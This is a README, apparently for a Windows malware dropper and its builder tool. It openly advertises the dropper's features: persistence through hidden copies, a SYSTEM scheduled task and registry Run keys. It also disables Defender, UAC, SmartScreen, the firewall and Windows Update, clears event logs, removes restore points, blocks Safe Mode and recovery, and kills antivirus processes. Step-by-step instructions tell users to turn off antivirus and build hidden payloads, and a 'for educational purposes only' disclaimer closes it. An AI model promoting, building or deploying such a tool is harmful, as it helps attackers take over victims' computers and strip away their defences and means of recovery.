# HUETA DROPPER

<p align="center">
  <img src="logo.png" alt="Hueta Dropper" width="200">
</p>

---

A dropper that ensures complete stability for your files and unlocks all possibilities.

Runs with administrator privileges (UAC prompt). First launch:

- Copies itself to hidden and system folders
- Adds to Task Scheduler (SYSTEM, at user logon)
- Adds to Registry (HKCU + HKLM Run)
- Cleans the system and deploys payload
- Launches background guardian

---

## Key Features

- 🛡️ Disables WinDefend, WdNisSvc, WdNisDrv, SecurityHealthService, wscsvc, SgrmBroker
- 🔇 Disables Real-time Monitoring, Behavior Monitoring, Cloud Protection (MAPS), sample submission
- 🔒 Full UAC disable
- 🖥️ SmartScreen disabled
- 🔥 Firewall disabled, MpsSvc stopped, all profiles off
- 🔄 Windows Update disabled, wuauserv, UsoSvc, WaaSMedicSvc, dosvc stopped + policies blocked
- 📋 EventLog, EventSystem disabled, logs cleared every 30 seconds
- 💾 System Restore points removed, WinRE disabled, Safe Mode blocked via BCD
- ⚡ High Performance power plan forced, sleep/hibernation/screensaver off
- 🔧 Driver auto-update disabled
- 🚫 Safe Mode, recovery, external boot blocked
- 🛑 Monitors 25 antivirus processes, forced termination

---

## INSTRUCTION

### Creating a Dropper

1. **Disable all antiviruses**, go to [Releases](../../releases) and download `Builder.exe`
2. Open `Builder.exe`
3. Go to the first tab, add your files that need to run **in hidden mode**

> ⚠️ **WARNING.** Do not put files that need to run in normal mode into the dropper. Use the unpacker after building.

<p align="center">
  <img src="screen1.png" alt="Builder Dropper" width="500">
</p>

4. Click the **"Build hueta.exe"** button and save the file. Your build is ready!

---

### Creating an Unpacker

1. Open `Builder.exe`
2. Go to the second tab, add your files that need to run **in normal mode**

<p align="center">
  <img src="screen2.png" alt="Builder Extractor" width="500">
</p>

3. Click the **"Build build.exe"** button and save the file. Your build is ready!

---

## Disclaimer

**For educational purposes only.** Use at your own risk.
